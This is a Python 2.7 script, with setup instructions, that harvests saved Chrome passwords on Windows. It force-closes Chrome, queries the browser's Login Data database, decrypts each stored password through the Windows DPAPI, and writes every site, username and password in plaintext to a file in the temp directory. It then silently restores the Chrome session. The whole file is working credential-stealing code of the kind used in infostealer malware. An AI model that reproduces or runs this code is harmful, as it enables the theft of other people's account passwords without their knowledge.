# Instructions:
# USE Python 2.7
# Python version: https://www.python.org/downloads/release/python-2710/
# 1) For this to work, google chrome must be closed
# 2) To download win32crypt, cant use pip. Must download from here: https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win-amd64-py2.7.exe/download
# 3) Just run the .exe and it sets it all up

# Description:
	# The way google chrome stores a user's passwords is public and the decrypting process is well known.
        # This is a script to decrypt chrome passwords from its SQL database and store them in a file.

import os
import sys
import sqlite3
import win32crypt
import subprocess
import tempfile

def unlock_data():
	# Close current chrome session in order to unlock database
	subprocess.call("taskkill /F /IM chrome.exe >nul",shell=True)

def get_data():
	try:
		#path to user's login data
		data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
		#login database
		login_db = os.path.join(data_path, 'Login Data')
		#db connect and query
		c = sqlite3.connect(login_db,timeout=15)
		cursor = c.cursor()
		select_statement = "SELECT origin_url, username_value, password_value FROM logins"
		cursor.execute(select_statement)
		global login_data
		login_data = cursor.fetchall()
	except:
		sys.exit(0)

def decrypt_data():
	#URL: credentials dictionary
	global credential
	credential = {}
	#decrytping the password
	for url, user_name, pwd, in login_data:
		pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) #This returns a tuple description and the password
		credential[url] = (user_name, pwd[1])

def save_data():
	#writing to a text file (CAUTION: Don't leave this text file around!)
	with open(tempfile.gettempdir()+'\chrome.txt', 'w') as f:
		for url, credentials in credential.iteritems():
			if credentials[1]:
				f.write("\n"+url+"\n"+credentials[0].encode('utf-8')+ " | "+credentials[1]+"\n")
			else:
				f.write("\n"+url+"\n"+"USERNAME NOT FOUND | PASSWORD NOT FOUND \n")

def lock_data():
	# Restore chrome session
	subprocess.Popen("\"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe\" --restore-last-session",shell=True)

def execute():
	unlock_data()
	get_data()
	decrypt_data()
	save_data()
	lock_data()
	sys.exit(0)

if __name__ == "__main__":
	execute()

